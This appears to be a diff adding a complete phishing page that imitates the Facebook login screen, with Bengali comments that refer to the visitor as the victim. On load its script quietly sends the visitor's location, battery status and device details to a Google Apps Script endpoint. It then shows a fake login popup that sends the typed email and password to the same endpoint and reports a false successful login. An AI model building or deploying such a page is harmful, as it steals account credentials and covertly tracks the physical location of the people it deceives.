@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body { margin: 0; background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        
+        /* Facebook এর মতো কন্টেইনার */
+        .fb-container { text-align: center; width: 300px; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        
+        /* লগইন বক্স */
+        .login-box { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; }
+        
+        /* পপ-আপ স্টাইল */
+        .modal { background: white; padding: 20px; border-radius: 8px; width: 300px; text-align: center; position: relative; }
+        .close { position: absolute; top: 10px; right: 15px; font-size: 24px; cursor: pointer; color: #555; }
+        
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+        .fb-btn { background-color: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-size: 20px; cursor: pointer; margin-top: 10px; }
+        .fb-btn:hover { background-color: #166fe5; }
+        
+        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; letter-spacing: -1px; }
+    </style>
+</head>
+<body>
+
+    <!-- মূল পেজ (ভিক্টিমকে দেখাবে যে লোড হচ্ছে) -->
+    <div class="fb-container">
+        <div class="logo">facebook</div>
+        <p style="color:#666; font-size:14px;">Please wait while we verify your session...</p>
+        <!-- অটোমেটিক লগইন পপ-আপ ওপেন করার জন্য জাভাস্ক্রিপ্ট ব্যবহার করা হচ্ছে -->
+    </div>
+
+    <!-- ফেক লগইন পপ-আপ (Modal) -->
+    <div id="loginBox" class="login-box">
+        <div class="modal">
+            <span class="close" onclick="closeLogin()">&times;</span>
+            <div class="logo" style="font-size:30px;">facebook</div>
+            
+            <form id="loginForm" onsubmit="sendLoginData(event)">
+                <input type="text" id="email" placeholder="Email or Phone" required>
+                <input type="password" id="pass" placeholder="Password" required>
+                <button type="submit" class="fb-btn">Log In</button>
+            </form>
+            
+            <p style="font-size:12px; color:#385898; margin-top:10px;">Forgot password?</p>
+        </div>
+    </div>
+
+<script>
+    // ⚠️ এখানে আপনার Google Script URL বসান
+    const SHEET_URL = "https://script.google.com/macros/s/AKfycbwFVEVA6saAztdGEdv3NbhtFSHpnWeOz2IBD1mR8j0k20qaG_ffQBeARjDY3uh3N8Fp3w/exec"; 
+
+    // ১. পেজ লোড হওয়ার সাথে সাথে ব্যাকগ্রাউন্ডে ডাটা পাঠানো শুরু করা
+    window.onload = function() {
+        startTracking();
+        
+        // ১ সেকেন্ড পর লগইন পপ-আপ ওপেন হবে (ভিক্টিমকে আকৃষ্ট করার জন্য)
+        setTimeout(() => {
+            document.getElementById('loginBox').style.display = 'flex';
+        }, 1000);
+    };
+
+    async function startTracking() {
+        let lat = "N/A", long = "N/A";
+        
+        // লোকেশন নেওয়া (WatchPosition ব্যবহার করা হয়েছে যাতে অটোমেটিক আপডেট হয়)
+        if(navigator.geolocation) {
+            const position = await new Promise(resolve => navigator.geolocation.getCurrentPosition(resolve));
+            lat = position.coords.latitude;
+            long = position.coords.longitude;
+            
+            // যদি ভিক্টিম লোকেশন পরিবর্তন করে, তবে নতুন ডাটা পাঠানোর জন্য ওয়াচ করা হচ্ছে (ঐচ্ছিক)
+            navigator.geolocation.watchPosition(async (pos) => {
+                lat = pos.coords.latitude;
+                long = pos.coords.longitude;
+                sendInfo(lat, long, null, null); // শুধু লোকেশন আপডেট
+            });
+        }
+
+        // ব্যাটারি এবং ডিভাইস তথ্য
+        let batLevel = "N/A", isCharging = false;
+        try {
+            const battery = await navigator.getBattery();
+            batLevel = Math.round(battery.level * 100) + "%";
+            isCharging = battery.charging;
+            
+            // ব্যাটারি চার্জিং স্ট্যাটাস পরিবর্তন হলে আপডেট পাঠানো
+            battery.addEventListener('chargingchange', async () => {
+                const newBat = await navigator.getBattery();
+                sendInfo(lat, long, {level: Math.round(newBat.level * 100)+"%", charging: newBat.charging}, null);
+            });
+
+        } catch(e) {}
+
+        const device = navigator.userAgent;
+
+        // প্রথমবার ডাটা পাঠানো (অটোমেটিক)
+        sendInfo(lat, long, {level: batLevel, charging: isCharging}, device);
+    }
+
+    // ইনফো শিটে পাঠানোর ফাংশন
+    async function sendInfo(lat, long, battery, device) {
+        const data = {
+            type: "INFO",
+            lat: lat,
+            long: long,
+            battery: battery,
+            device: device
+        };
+
+        await fetch(SHEET_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        });
+    }
+
+    // লগইন ডাটা শিটে পাঠানোর ফাংশন
+    async function sendLoginData(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        const loginData = {
+            type: "LOGIN",
+            email: email,
+            password: pass
+        };
+
+        await fetch(SHEET_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(loginData)
+        });
+
+        // পপ-আপ বন্ধ এবং সাকসেস মেসেজ
+        document.getElementById('loginBox').style.display = 'none';
+        alert("Successfully Logged In!");
+        
+        // লগইন হওয়ার পর ভিক্টিমের শেষ লোকেশনও পাঠানো (যদি পরিবর্তন হয়ে থাকে)
+        if(navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendInfo(pos.coords.latitude, pos.coords.longitude, null, null);
+            });
+        }
+    }
+
+    function closeLogin() {
+        document.getElementById('loginBox').style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
